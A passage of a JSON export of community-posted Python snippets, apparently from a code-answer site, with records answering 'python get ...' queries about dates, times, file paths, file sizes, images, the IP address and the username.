    "reg_date": "2021-10-12T11:33:18.000Z"
  },
  {
    "id": 3354,
    "keyword": null,
    "link": null,
    "title": " python get class",
    "description": "x.__class__.__name__\nuser = User() type(user).__name__ >> 'User'\n",
    "reg_date": "2021-10-12T11:33:18.000Z"
  },
  {
    "id": 3355,
    "keyword": null,
    "link": null,
    "title": " python get command line arguments",
    "description": "import sys print(\"This is the name of the script:\", sys.argv[0]) print(\"Number of arguments:\", len(sys.argv)) print(\"The arguments are:\" , str(sys.argv))  #Example output #This is the name of the script: sysargv.py #Number of arguments in: 3 #The arguments are: ['sysargv.py', 'arg1', 'arg2']\nimport sys  def hello(a,b):     print \"hello and that's your sum:\", a + b  if __name__ == \"__main__\":     a = int(sys.argv[1])     b = int(sys.argv[2])     hello(a, b) # If you type : py main.py 1 5 # It should give you \"hello and that's your sum:6\"\n#!/usr/bin/python  import sys  print 'Number of arguments:', len(sys.argv), 'arguments.' print 'Argument List:', str(sys.argv)  #Terminal # $ python test.py arg1 arg2 arg3  #print #Number of arguments: 4 arguments. #Argument List: ['test.py', 'arg1', 'arg2', 'arg3']  \n#!/usr/bin/python  import sys  for args in sys.argv:   print(args)  \"\"\" If you were to call the program with subsequent arguments, the output  will be of the following Call: python3 sys.py homie no  Output: sys.py homie no \"\"\"\n#!/usr/bin/python  import sys  print 'Number of arguments:', len(sys.argv), 'arguments.' print 'Argument List:', str(sys.argv)\nimport java.util.Scanner; import java.io.File; Scanner input = new Scanner(new File(args[0])); //Where args[0] is the cmd argument, the file name\n",
    "reg_date": "2021-10-12T11:33:18.000Z"
  },
  {
    "id": 3356,
    "keyword": null,
    "link": null,
    "title": " python get cpu info",
    "description": "import cpuinfo  print('CPU =', cpuinfo.get_cpu_info()['brand_raw'])\n# Importing the library import psutil    # Calling psutil.cpu_precent() for 4 seconds print('The CPU usage is: ', psutil.cpu_percent(4)) \n",
    "reg_date": "2021-10-12T11:33:18.000Z"
  },
  {
    "id": 3357,
    "keyword": null,
    "link": null,
    "title": " python get current file location",
    "description": "import os os.path.dirname(os.path.abspath(__file__))\nimport os.path extension = os.path.splitext(filename)[1]\nimport pathlib pathlib.Path(__file__).parent.absolute()\n",
    "reg_date": "2021-10-12T11:33:18.000Z"
  },
  {
    "id": 3358,
    "keyword": null,
    "link": null,
    "title": " python get current month",
    "description": "Use:  from datetime import datetime today = datetime.today() datem = datetime(today.year, today.month, 1) I assume you want the first of the month.\n",
    "reg_date": "2021-10-12T11:33:18.000Z"
  },
  {
    "id": 3359,
    "keyword": null,
    "link": null,
    "title": " python get current mouse position",
    "description": "from pynput.mouse import Button, Controller mouse = Controller() current_mouse_position = mouse.position print(current_mouse_position)\nimport pyautogui pos = pyautogui.position()\n",
    "reg_date": "2021-10-12T11:33:18.000Z"
  },
  {
    "id": 3360,
    "keyword": null,
    "link": null,
    "title": " python get current time",
    "description": "from datetime import datetime now = datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))   Output: 2020-06-19 10:34:45\nimport datetime   currentDT = datetime.datetime.now() print(str(currentDT))  # prints XXXX-XX-XX XX:XX:XX.XXXXXX # or  import datetime   currentDT = datetime.datetime.now()   print (\"Current Year is: %d\" % currentDT.year) print (\"Current Month is: %d\" % currentDT.month) print (\"Current Day is: %d\" % currentDT.day) print (\"Current Hour is: %d\" % currentDT.hour) print (\"Current Minute is: %d\" % currentDT.minute) print (\"Current Second is: %d\" % currentDT.second) print (\"Current Microsecond is: %d\" % currentDT.microsecond) # prints \"\"\" Current Year is: XXXX Current Month is: XX Current Day is: XX Current Hour is: XX Current Minute is: XX Current Second is: XX Current Microsecond is: XXXXXX \"\"\"\nfrom datetime import date //today is an object so you can get the day, month and year by //treating it as an object. eg: today.day, today.month, today.year today = date.today() print(\"Today's date:\", today)\n from datetime import datetime  now = datetime.now()  current_time = now.strftime(\"%H:%M:%S\") print(\"Current Time =\", current_time) \n\"\"\"Imports the datetime package from the Python library\"\"\" from datetime import datetime  \"\"\"Sets the variable now to the current date and time\"\"\" now = datetime.now()  \"\"\"The variable current_time contains the string values of the current time\"\"\" current_time = now.strftime(\"%H:%M:%S\") print(\"Current Time =\", current_time)\n--------------------------------------------------------- import datetime   currentDateTime = datetime.datetime.now() print(currentDateTime) --------------------------------------------------------- OR --------------------------------------------------------- from datetime import datetime   currentDateTime = datetime.now() print(currentDateTime) --------------------------------------------------------- OR --------------------------------------------------------- import datetime  print(datetime.datetime.now()) --------------------------------------------------------- OR --------------------------------------------------------- from datetime import datetime   print(datetime.now()) ---------------------------------------------------------\n",
    "reg_date": "2021-10-12T11:33:18.000Z"
  },
  {
    "id": 3361,
    "keyword": null,
    "link": null,
    "title": " python get current time in seconds",
    "description": "import time milliseconds = int(round(time.time() * 1000)) print(milliseconds)\nfrom datetime import datetime as d import time as t from os import system as clear cls = lambda: clear(\"clear\")  prev = d.now() prev = prev.strftime(\"%Y-%m-%d %H:%M:%S\")  while True:   time = d.now()   time = time.strftime(\"%Y-%m-%d %H:%M:%S\")   print(time)   if not time == prev:     prev = time   t.sleep(1)   cls() \n--------------------------------------------------------- import datetime   currentDateTime = datetime.datetime.now() print(currentDateTime) --------------------------------------------------------- OR --------------------------------------------------------- from datetime import datetime   currentDateTime = datetime.now() print(currentDateTime) --------------------------------------------------------- OR --------------------------------------------------------- import datetime  print(datetime.datetime.now()) --------------------------------------------------------- OR --------------------------------------------------------- from datetime import datetime   print(datetime.now()) ---------------------------------------------------------\n",
    "reg_date": "2021-10-12T11:33:18.000Z"
  },
  {
    "id": 3362,
    "keyword": null,
    "link": null,
    "title": " python get date and time",
    "description": "from datetime import date  today = date.today() print(\"Today's date:\", today)\nfrom datetime import datetime now = datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))   Output: 2020-06-19 10:34:45\nimport datetime now = datetime.datetime.now() print (\"Current date and time : \") print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))  \nfrom datetime import datetime  # datetime object containing current date and time now = datetime.now()   print(\"now =\", now)  # dd/mm/YY H:M:S dt_string = now.strftime(\"%d/%m/%Y %H:%M:%S\") print(\"date and time =\", dt_string)\t  # now = 2021-06-25 07:58:56.550604 # date and time = 25/06/2021 07:58:56\nfrom datetime import datetime  now = datetime.now().time().strftime(\"%H:%M:%S\") # time object date = datetime.now().strftime(\"%Y-%m-%d\") # date object print(\"date:\",date) print(\"time =\", now)\nfrom datetime import date  today = date.today() print(\"Today's date:\", today) \n",
    "reg_date": "2021-10-12T11:33:18.000Z"
  },
  {
    "id": 3363,
    "keyword": null,
    "link": null,
    "title": " python get date file last modified",
    "description": "# note: test.txt can also be a file path import os.path, time print(\"Last modified: %s\" % time.ctime(os.path.getmtime(\"test.txt\"))) print(\"Created: %s\" % time.ctime(os.path.getctime(\"test.txt\")))\nimport os, time # Get file's Last modification time stamp only in terms of seconds since epoch  modTimesinceEpoc = os.path.getmtime(filePath) # Convert seconds since epoch to readable timestamp modificationTime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(modTimesinceEpoc)) print(\"Last Modified Time : \", modificationTime )\nimport os import platform  def creation_date(path_to_file):     \"\"\"     Try to get the date that a file was created, falling back to when it was     last modified if that isn't possible.     See http://stackoverflow.com/a/39501288/1709587 for explanation.     \"\"\"     if platform.system() == 'Windows':         return os.path.getctime(path_to_file)     else:         stat = os.stat(path_to_file)         try:             return stat.st_birthtime         except AttributeError:             # We're probably on Linux. No easy way to get creation dates here,             # so we'll settle for when its content was last modified.             return stat.st_mtime\nimport os time = os.path.getmtime(\"file.txt\")  print(time) # 1600113737.82\n",
    "reg_date": "2021-10-12T11:33:19.000Z"
  },
  {
    "id": 3364,
    "keyword": null,
    "link": null,
    "title": " python get day name",
    "description": "import datetime now = datetime.datetime.now() print(now.strftime(\"%A\"))\n",
    "reg_date": "2021-10-12T11:33:19.000Z"
  },
  {
    "id": 3365,
    "keyword": null,
    "link": null,
    "title": " python get dict values as list",
    "description": "food_list=list(data.values()) print(food_list)\nd.values()\n",
    "reg_date": "2021-10-12T11:33:19.000Z"
  },
  {
    "id": 3366,
    "keyword": null,
    "link": null,
    "title": " python get dir",
    "description": "import os  path = os.getcwd()  print(path) # /Users/mbp/Documents/my-project/python-snippets/notebook  print(type(path)) # <class 'str'> \nimport os  dir_path = os.path.dirname(os.path.realpath(__file__))\nimport os os.getcwd() \nimport os  #full path dir_path = os.path.dirname(os.path.realpath(__file__))  #current dir cwd = os.getcwd() \n# print current working directory in python import os cwd = os.getcwd() print(cwd)\nimport os print(os.path.abspath('')) \n",
    "reg_date": "2021-10-12T11:33:19.000Z"
  },
  {
    "id": 3367,
    "keyword": null,
    "link": null,
    "title": " python get directory path of script",
    "description": "import os os.path.abspath(os.getcwd())\nimport os  # To get absolute path to current script absolutePath = os.path.realpath(__file__) print(absoultePath) # c:\\File\\Path\\to\\Current\\Script.py  # To get absolute path excluding file name directory = (\"//\".join(os.path.realpath(__file__).split('//')[:-1])) print(directory) \t# c:\\File\\Path\\to\\Current\t  split('\\\\') for windows\nimport os print(os.path.abspath('')) \n#Python 3  #For the directory of the script being run:  import pathlib pathlib.Path(__file__).parent.resolve()  #For the current working directory:  import pathlib pathlib.Path().resolve()  #Python 2 and 3  #For the directory of the script being run:  import os os.path.dirname(os.path.abspath(__file__))  #If you mean the current working directory:  import os os.path.abspath(os.getcwd())\nimport os os.path.abspath(__file__) # Directory of current python script #Output will look something like: C:\\Users\\UserName\\Desktop\\py-script.py\nfrom os import getcwd # only import \"getcwd\" from os  getcwd() # Get the current working directory\n",
    "reg_date": "2021-10-12T11:33:19.000Z"
  },
  {
    "id": 3368,
    "keyword": null,
    "link": null,
    "title": " python get domain from url",
    "description": "from urllib.parse import urlparse  domain = urlparse('http://www.example.test/foo/bar').netloc print(domain) # --> www.example.test\nfrom urllib.parse import urlparse domain = urlparse('https://supermavster.com').netloc\n",
    "reg_date": "2021-10-12T11:33:19.000Z"
  },
  {
    "id": 3369,
    "keyword": null,
    "link": null,
    "title": " python get exception message",
    "description": "try:   # some code except Exception as e: \tprint(\"ERROR : \"+str(e))\ntry:     with open(filepath,'rb') as f:         con.storbinary('STOR '+ filepath, f)     logger.info('File successfully uploaded to '+ FTPADDR) except Exception as e: # work on python 3.x     logger.error('Failed to upload to ftp: '+ str(e))\n>>> try: ...     raise Exception('spam', 'eggs') ... except Exception as inst: ...     print(type(inst))    # the exception instance ...     print(inst.args)     # arguments stored in .args ...     print(inst)          # __str__ allows args to be printed directly, ...                          # but may be overridden in exception subclasses ...     x, y = inst.args     # unpack args ...     print('x =', x) ...     print('y =', y) ... <class 'Exception'> ('spam', 'eggs') ('spam', 'eggs') x = spam y = eggs \ntry:    # Code to test / execute    print('Test') except (SyntaxError, IndexError) as E:  # specific exceptions    # Code in case of SyntaxError for example    print('Synthax or index error !') except :    # Code for any other exception    print('Other error !') else:    # Code if no exception caught    print('No error') finally:    # Code executed after try block (success) or any exception (ie everytime)    print('Done')  # This code is out of try / catch bloc print('Anything else')\n",
    "reg_date": "2021-10-12T11:33:19.000Z"
  },
  {
    "id": 3370,
    "keyword": null,
    "link": null,
    "title": " python get file date creation",
    "description": "import os import platform  def creation_date(path_to_file):     \"\"\"     Try to get the date that a file was created, falling back to when it was     last modified if that isn't possible.     See http://stackoverflow.com/a/39501288/1709587 for explanation.     \"\"\"     if platform.system() == 'Windows':         return os.path.getctime(path_to_file)     else:         stat = os.stat(path_to_file)         try:             return stat.st_birthtime         except AttributeError:             # We're probably on Linux. No easy way to get creation dates here,             # so we'll settle for when its content was last modified.             return stat.st_mtime\n",
    "reg_date": "2021-10-12T11:33:19.000Z"
  },
  {
    "id": 3371,
    "keyword": null,
    "link": null,
    "title": " python get file extension from path",
    "description": "import pathlib  print(pathlib.Path('yourPath.example').suffix) # '.example' #or  import os filename, file_extension = os.path.splitext('/path/to/somefile.ext')\nimport os.path extension = os.path.splitext(filename)[1]\n>>> import os >>> filename, file_extension = os.path.splitext('/path/to/somefile.ext') >>> filename '/path/to/somefile' >>> file_extension '.ext'\n",
    "reg_date": "2021-10-12T11:33:19.000Z"
  },
  {
    "id": 3372,
    "keyword": null,
    "link": null,
    "title": " python get file size in mb",
    "description": "import os os.path.getsize(\"path/to/file\") / (1024*1024)\nimport math  def convert_size(size_bytes):    if size_bytes == 0:        return \"0B\"    size_name = (\"B\", \"KB\", \"MB\", \"GB\", \"TB\", \"PB\", \"EB\", \"ZB\", \"YB\")    i = int(math.floor(math.log(size_bytes, 1024)))    p = math.pow(1024, i)    s = round(size_bytes / p, 2)    return \"%s %s\" % (s, size_name[i])\n",
    "reg_date": "2021-10-12T11:33:19.000Z"
  },
  {
    "id": 3373,
    "keyword": null,
    "link": null,
    "title": " python get filename from path",
    "description": "import os print(os.path.basename(your_path))\nimport os files_and_directories = os.listdir(\"path/to/directory\")\nimport os infile = \"./../../../../_data/matrix_data/5mer_normalized.tsv\" print(os.path.basename(infile)) >>> \"5mer_normalized.tsv\"\nfilename = os.path.basename(\"path/to/file/sample.txt\")\n",
    "reg_date": "2021-10-12T11:33:20.000Z"
  },
  {
    "id": 3374,
    "keyword": null,
    "link": null,
    "title": " python get financial data",
    "description": "#In your command prompt you first need to install yfinance by running: #pip install yfinance import yfinance as yf AAPL = yf.Ticker('AAPL').history('5y')\n",
    "reg_date": "2021-10-12T11:33:20.000Z"
  },
  {
    "id": 3375,
    "keyword": null,
    "link": null,
    "title": " python get full path",
    "description": "import os # you have to be in the same directory as the file file = 'myfile.txt' # or also file = 'directory/to/myfile.txt'  path = os.path.abspath(file) \n>>> import os >>> os.path.abspath(\"mydir/myfile.txt\") 'C:/example/cwd/mydir/myfile.txt' \n",
    "reg_date": "2021-10-12T11:33:20.000Z"
  },
  {
    "id": 3376,
    "keyword": null,
    "link": null,
    "title": " python get human readable file size",
    "description": "def human_readable_size(size, decimal_places=3):     for unit in ['B','KiB','MiB','GiB','TiB']:         if size < 1024.0:             break         size /= 1024.0     return f\"{size:.{decimal_places}f}{unit}\"\n",
    "reg_date": "2021-10-12T11:33:20.000Z"
  },
  {
    "id": 3377,
    "keyword": null,
    "link": null,
    "title": " python get image dimensions",
    "description": "from PIL import Image  im = Image.open('whatever.png') width, height = im.size\nfrom PIL import Image  img = Image.open('path/to/image') width, height = img.size im.close()\nimg = Image.open(\"test.png\") img = img.size # img.size is a tuple\n",
    "reg_date": "2021-10-12T11:33:20.000Z"
  },
  {
    "id": 3378,
    "keyword": null,
    "link": null,
    "title": " python get image size",
    "description": "from PIL import Image  im = Image.open('whatever.png') width, height = im.size\nfrom PIL import Image  img = Image.open('path/to/image') width, height = img.size im.close()\nimg = Image.open(\"test.png\") img = img.size # img.size is a tuple\n",
    "reg_date": "2021-10-12T11:33:20.000Z"
  },
  {
    "id": 3379,
    "keyword": null,
    "link": null,
    "title": " python get ip from hostname",
    "description": "## importing socket module import socket ## getting the hostname by socket.gethostname() method hostname = socket.gethostname() ## getting the IP address using socket.gethostbyname() method ip_address = socket.gethostbyname(hostname) ## printing the hostname and ip_address print(f\"Hostname: {hostname}\") print(f\"IP Address: {ip_address}\")\n",
    "reg_date": "2021-10-12T11:33:20.000Z"
  },
  {
    "id": 3380,
    "keyword": null,
    "link": null,
    "title": " python get keypressed value",
    "description": "import keyboard  # using module keyboard while True:  # making a loop     try:  # used try so that if user pressed other than the given key error will not be shown         if keyboard.is_pressed('q'):  # if key 'q' is pressed              print('You Pressed A Key!')             break  # finishing the loop     except:         break  # if user pressed a key other than the given key the loop will break\n",
    "reg_date": "2021-10-12T11:33:20.000Z"
  },
  {
    "id": 3381,
    "keyword": null,
    "link": null,
    "title": " python get last element in list",
    "description": "# To get the last element in a list you use -1 as position bikes = ['trek', 'redline', 'giant'] bikes[-1] # Output: # 'giant'\nsome_list[-1]\nMyList=[\"Black\",\"Blue\",\"Red\",\"Green\"] print(MyList[-1])\nprint(list[-1])\nlist1 = ['a','b','c'] print(list1[-1])\nl = [1, 2, 3] l[-1]\n",
    "reg_date": "2021-10-12T11:33:20.000Z"
  },
  {
    "id": 3382,
    "keyword": null,
    "link": null,
    "title": " python get latest edited file from any directory",
    "description": "from os.path import expanduser import os home = expanduser(\"~\") latest_edited_folder = max([f for f in os.scandir(home)], key=lambda x: x.stat().st_mtime).name search_on = home+'\\\\'+latest_edited_folder latest_edited_file = max([f for f in os.scandir(search_on)], key=lambda x: x.stat().st_mtime).name\n",
    "reg_date": "2021-10-12T11:33:20.000Z"
  },
  {
    "id": 3383,
    "keyword": null,
    "link": null,
    "title": " python get line number of error",
    "description": "import sys, os  try:     raise NotImplementedError(\"No error\") except Exception as e:     exc_type, exc_obj, exc_tb = sys.exc_info()     fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]     print(exc_type, fname, exc_tb.tb_lineno)\n",
    "reg_date": "2021-10-12T11:33:21.000Z"
  },
  {
    "id": 3384,
    "keyword": null,
    "link": null,
    "title": " python get list of files in path",
    "description": "from os import listdir from os.path import isfile, join onlyfiles = [f for f in listdir(mypath) if isfile(join(mypath, f))]\n",
    "reg_date": "2021-10-12T11:33:21.000Z"
  },
  {
    "id": 3385,
    "keyword": null,
    "link": null,
    "title": " python get minute from datetime",
    "description": "import datetime date = '2021-05-21 11:22:03' datem = datetime.datetime.strptime(date, \"%Y-%m-%d %H:%M:%S\") print(datem.day)        # 25 print(datem.month)      # 5 print(datem.year)       # 2021 print(datem.hour)       # 11 print(datem.minute)     # 22 print(datem.second)     # 3\n",
    "reg_date": "2021-10-12T11:33:21.000Z"
  },
  {
    "id": 3386,
    "keyword": null,
    "link": null,
    "title": " python get newest file in directory",
    "description": "import glob import os  list_of_files = glob.glob('/path/to/folder/*') # * means all if need specific format then *.csv latest_file = max(list_of_files, key=os.path.getctime) print(latest_file) \n",
    "reg_date": "2021-10-12T11:33:21.000Z"
  },
  {
    "id": 3387,
    "keyword": null,
    "link": null,
    "title": " python get numbers from string",
    "description": ">>> str = \"h3110 23 cat 444.4 rabbit 11 2 dog\" >>> [int(s) for s in str.split() if s.isdigit()] [23, 11, 2] \nstring = \"abc123\" # Method 1 ''.join(char for char in string if char.isdigit())  #Method 2 import re re.sub(\"[^0-9]\", \"\", string)\nstring = \"I am 14 years old\" for i in string.split():   if i.isdigit():     print(i) print() \n>>> import re >>> string1 = \"498results should get\" >>> int(re.search(r'\\d+', string1).group()) 498\n",
    "reg_date": "2021-10-12T11:33:21.000Z"
  },
  {
    "id": 3388,
    "keyword": null,
    "link": null,
    "title": " python get output of command to variable",
    "description": "import subprocess as sp output = sp.getoutput('whoami --version') print (output)\n#!/usr/bin/python import subprocess, sys ## command to run - tcp only ## cmd = \"/usr/sbin/netstat -p tcp -f inet\" ## run it ## p = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE) ## But do not wait till netstat finish, start displaying output immediately ## while True:     out = p.stderr.read(1)     if out == '' and p.poll() != None:         break     if out != '':         sys.stdout.write(out)         sys.stdout.flush()\n",
    "reg_date": "2021-10-12T11:33:21.000Z"
  },
  {
    "id": 3389,
    "keyword": null,
    "link": null,
    "title": " python get pid",
    "description": "# Simple python program to explain the os.getpid() method: import os # You need to import the os libary pid = os.getpid() # set the pid variable to the id of the current process print(pid) # Let's print out the process id \n",
    "reg_date": "2021-10-12T11:33:22.000Z"
  },
  {
    "id": 3390,
    "keyword": null,
    "link": null,
    "title": " python get pixel values from image",
    "description": "from PIL import Image  img = Image.open('example.png') imgWidth, imgHeight = img.size img = img.convert(\"RGBA\") imgdata = img.getdata()  x_pos = 0 y_pos = 1  pixel_value = [] x = [] y = []  for item in imgdata:     if (x_pos) == imgWidth:         x_pos = 1         y_pos += 1     else:         x_pos += 1      if item[3] != 0:         pixel_value.append(item[2])         x.append(x_pos)         y.append(y_pos)  pixel_value, x, y = zip(*sorted(zip(pixel_value, x, y), reverse=True))  print(f'{pixel_value}\\n{x}\\n{y}')\n",
    "reg_date": "2021-10-12T11:33:22.000Z"
  },
  {
    "id": 3391,
    "keyword": null,
    "link": null,
    "title": " python get position of character in string",
    "description": "foo = \"abcdefc\"  # Using find() foo.find('c') # Output: 2 foo.find('g') # Output: -1  # Using index() # foo.index() is like foo.find(), # But when the substring is not found, it raises an exception. foo.index('h') # ValueError: substring not found\n>>> myString = 'Position of a character' >>> myString.find('s') 2 >>> myString.find('x') -1\ns = \"mouse\" animal_letter = s.find('s') print animal_letter\nmy_var = 'mummy'. #Find the position of 'm'  #Using find - find returns the index for the first instance from the left. my_var.find('m') # Output: 0  #Using rfind - rfind returns the index for the first instance from the right. my_var.rfind('m') # Output: 3 # With find() and rfind(), when substring is not found, it returns -1.  #NB: You can use index() and rindex(). In this case, when the substring is not # found, it raises an exception.\n",
    "reg_date": "2021-10-12T11:33:22.000Z"
  },
  {
    "id": 3392,
    "keyword": null,
    "link": null,
    "title": " python get public ip address",
    "description": "from requests import get  ip = get('https://api.ipify.org').text print(f'My public IP address is: {ip}')\n# This example requires the requests library be installed.  You can learn more # about the Requests library here: http://docs.python-requests.org/en/latest/  from requests import get  ip = get('https://api.ipify.org').text print 'My public IP address is:', ip\n# this is more faster solution written in python2 tho :D # comapre it with other solutions and you'll see  import urllib2  def get_public_ip(request_target): \tgrabber = urllib2.build_opener() \tgrabber.addheaders = [('Useragent','Mozilla/5.0')] \ttry: \t\tpublic_ip_address = grabber.open(target_url).read() \texcept urllib2.HTTPError, error: \t\tprint(\"There was an error trying to get your Public IP: %s\") % (error) \texcept urllib2.URLError, error: \t\tprint(\"There was an error trying to get your Public IP: %s\") % (error) \treturn public_ip_address  public_ip = \"None\" target_url = \"http://ip.42.pl/raw\" public_ip = get_public_ip(target_url)  if not \"None\" in public_ip: \tprint(\"Your Public IP address is: %s\") % (str(public_ip)) else: \tprint(\"Your Public IP address was not found\")\n",
    "reg_date": "2021-10-12T11:33:22.000Z"
  },
  {
    "id": 3393,
    "keyword": null,
    "link": null,
    "title": " python get script name",
    "description": "# Option 1: Works for Python 3.4 + from pathlib import Path Path(__file__).name\t\t# ScriptName.py Path(__file__).stem\t\t# ScriptName  # Option 2: use `os` library  import os os.path.basename(__file__)\t\t\t\t\t\t\t# ScriptName.py os.path.splitext(os.path.basename(__file__))[0]\t\t# ScriptName\nimport os  os.path.basename(__file__)\nUse __file__. If you want to omit the directory part (which might be present), you can use os.path.basename(__file__)\n",
    "reg_date": "2021-10-12T11:33:22.000Z"
  },
  {
    "id": 3394,
    "keyword": null,
    "link": null,
    "title": " python get script path",
    "description": "import os def GetScriptPath():     return os.path.realpath(__file__);  print(GetScriptPath());\nos.getcwd()\nimport os print(os.path.abspath('')) \n",
    "reg_date": "2021-10-12T11:33:22.000Z"
  },
  {
    "id": 3395,
    "keyword": null,
    "link": null,
    "title": " python get size of file",
    "description": ">>> import os >>> b = os.path.getsize(\"/path/isa_005.mp3\") >>> b 2071611\nimport os  # get size in bytes path = 'path/to/file.txt' size = os.path.getsize(path)\nimport os the_file_that_you_Want_to_check_the_size = os.path.getsize(\"The file Name\") print(the_file_that_you_Want_to_check_the_size) # Your result #\nimport os filepath='file1.txt' size=os.path.getsize(filepath) print(str(size) + ' Bytes') \nimport os os.path.getsize('C:\\\\Python27\\\\Lib\\\\genericpath.py')\n",
    "reg_date": "2021-10-12T11:33:22.000Z"
  },
  {
    "id": 3396,
    "keyword": null,
    "link": null,
    "title": " python get stock data",
    "description": "import yfinance as yf import matplotlib.pyplot as plt # Get the data for the stock Apple by specifying the stock ticker, start date, and end date data = yf.download('AAPL','2016-01-01','2018-01-01')  # Plot the close prices data.Close.plot() plt.show()\n",
    "reg_date": "2021-10-12T11:33:22.000Z"
  },
  {
    "id": 3397,
    "keyword": null,
    "link": null,
    "title": " python get the current date",
    "description": "from datetime import date  today = date.today() print(\"Today's date:\", today)\nfrom datetime import datetime now = datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))   Output: 2020-06-19 10:34:45\n# Example usage: import datetime date_time = datetime.datetime.now() print(date_time) --> 2020-10-03 15:29:54.822751  # From the date_time variable, you can extract the date in various # custom formats with .strftime(), for example: date_time.strftime(\"%d/%m/%Y\") --> '03/10/2020' # dd/mm/yyyy  date_time.strftime(\"%m/%d/%y\") --> '10/03/20' # mm/dd/yy  date_time.strftime(\"%Y/%m/%d\") --> '2020/10/03'  date_time.strftime(\"%Y-%m-%d\") --> '2020-10-03'  date_time.strftime(\"%B %d, %Y\") --> 'October 03, 2020'  # Key for other custom date/time formats: Directive\tDescription\t\t\t\t\t\t\t\tExample %a\t\t\tWeekday, short version\t\t\t\t\tWed\t %A\t\t\tWeekday, full version\t\t\t\t\tWednesday\t %w\t\t\tWeekday as a number 0-6, 0 is Sunday\t3\t %d\t\t\tDay of month 01-31\t\t\t\t\t\t31\t %b\t\t\tMonth name, short version\t\t\t\tDec\t %B\t\t\tMonth name, full version\t\t\t\tDecember\t %m\t\t\tMonth as a number 01-12\t\t\t\t\t12\t %y\t\t\tYear, short version, without century\t18\t %Y\t\t\tYear, full version\t\t\t\t\t\t2018\t %H\t\t\tHour 00-23\t\t\t\t\t\t\t\t17\t %I\t\t\tHour 00-12\t\t\t\t\t\t\t\t05\t %p\t\t\tAM/PM\t\t\t\t\t\t\t\t\tPM\t %M\t\t\tMinute 00-59\t\t\t\t\t\t\t41\t %S\t\t\tSecond 00-59\t\t\t\t\t\t\t08\t %f\t\t\tMicrosecond 000000-999999\t\t\t\t548513\t %z\t\t\tUTC offset\t\t\t\t\t\t\t\t+0100\t %Z\t\t\tTimezone\t\t\t\t\t\t\t\tCST\t %j\t\t\tDay number of year 001-366\t\t\t\t365\t %U\t\t\tWeek number of year 00-53\t\t\t\t52\t %c\t\t\tLocal version of date and time\t\t\tMon Dec 31 17:41:00 2018\t %x\t\t\tLocal version of date\t\t\t\t\t12/31/18\t %X\t\t\tLocal version of time\t\t\t\t\t17:41:00\t %%\t\t\tA % character\t\t\t\t\t\t\t%\nfrom datetime import date today = date.today().strftime(\"%d-%m-%Y\")\nfrom datetime import date //today is an object so you can get the day, month and year by //treating it as an object. eg: today.day, today.month, today.year today = date.today() print(\"Today's date:\", today)\nfrom datetime import datetime now = datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\")) \n",
    "reg_date": "2021-10-12T11:33:22.000Z"
  },
  {
    "id": 3398,
    "keyword": null,
    "link": null,
    "title": " python get the key with the max or min value in a dictionary",
    "description": "a_dictionary = {\"a\": 1, \"b\": 2, \"c\": 3}  # get key with max value max_key = max(a_dictionary, key=a_dictionary.get)  print(max_key)\n# Basic syntax: key_with_max_value = max(dictionary, key=dictionary.get)  # Note, to get the max value itself, you can do either of the following: max_value = dictionary[max(dictionary, key=dictionary.get)] max_value = max(dictionary.values())  # Example usage: dictionary = {\"a\": 1, \"b\": 2, \"c\": 3} max(dictionary, key=dictionary.get) --> 'c'\nimport operator stats = {'a':1000, 'b':3000, 'c': 100} max(stats.iteritems(), key=operator.itemgetter(1))[0]\n",
    "reg_date": "2021-10-12T11:33:22.000Z"
  },
  {
    "id": 3399,
    "keyword": null,
    "link": null,
    "title": " python get time milliseconds",
    "description": "import time  def current_milli_time():     return round(time.time() * 1000)\nimport time milliseconds = int(round(time.time() * 1000)) print(milliseconds)\n",
    "reg_date": "2021-10-12T11:33:22.000Z"
  },
  {
    "id": 3400,
    "keyword": null,
    "link": null,
    "title": " python get timestamp of today",
    "description": "import datetime ts = datetime.datetime.now().timestamp()\n",
    "reg_date": "2021-10-12T11:33:23.000Z"
  },
  {
    "id": 3401,
    "keyword": null,
    "link": null,
    "title": " python get today's date without time",
    "description": "now = datetime.date.today()\nfor printing current date \n",
    "reg_date": "2021-10-12T11:33:23.000Z"
  },
  {
    "id": 3402,
    "keyword": null,
    "link": null,
    "title": " python get type class name",
    "description": "type(x).__name__\nclass SillyClassName:     @classmethod  \tdef my_name(cls_): \t\treturn cls_.__name__   def class_name(self):   \t# self.__class__ gets the current class     # .__name__ gets the name \treturn self.__class__.__name__  SillyClassName.my_name() # prints SillyClassName  inst = SillyClassName() inst.class_name() # prints SillyClassName\n",
    "reg_date": "2021-10-12T11:33:23.000Z"
  },
  {
    "id": 3403,
    "keyword": null,
    "link": null,
    "title": " python get user home directory",
    "description": "from os.path import expanduser home = expanduser(\"~\")\nfrom pathlib import Path home = str(Path.home())\n",
    "reg_date": "2021-10-12T11:33:23.000Z"
  },
  {
    "id": 3404,
    "keyword": null,
    "link": null,
    "title": " python get username",
    "description": "import os  username = os.getlogin()\nusername = os.getlogin()\n",
    "reg_date": "2021-10-12T11:33:23.000Z"
  },
  {
    "id": 3405,
    "keyword": null,
    "link": null,
    "title": " python get username windows",
    "description": "import os  username = os.getlogin()\nusername = os.getlogin()\nimport os current_user = os.getlogin()\n",
    "reg_date": "2021-10-12T11:33:23.000Z"
  },
  {
    "id": 3406,
    "keyword": null,
    "link": null,
    "title": " python get utc time",
    "description": "from datetime import datetime  # time_in_utc variable will be the utc time  time_in_utc = datetime.utcnow()  # If you want to make it more fancier: formatted_time_in_utc = time_in_utc.strftime(\"%d/%m/%Y %H:%M:%S\")\nfrom datetime import datetime, timezone print(datetime.now())              # timezone print(datetime.now(timezone.utc))  # coordinated universal time \n",
    "reg_date": "2021-10-12T11:33:25.000Z"
  },
  {
    "id": 3407,
    "keyword": null,
    "link": null,
    "title": " python get webpage source",
    "description": "import requests  url = input('Webpage to grab source from: ') html_output_name = input('Name for html file: ')  req = requests.get(url, 'html.parser')  with open(html_output_name, 'w') as f:     f.write(req.text)     f.close() \n",
    "reg_date": "2021-10-12T11:33:25.000Z"
  },
  {
    "id": 3408,
    "keyword": null,
    "link": null,
    "title": " python gmail",
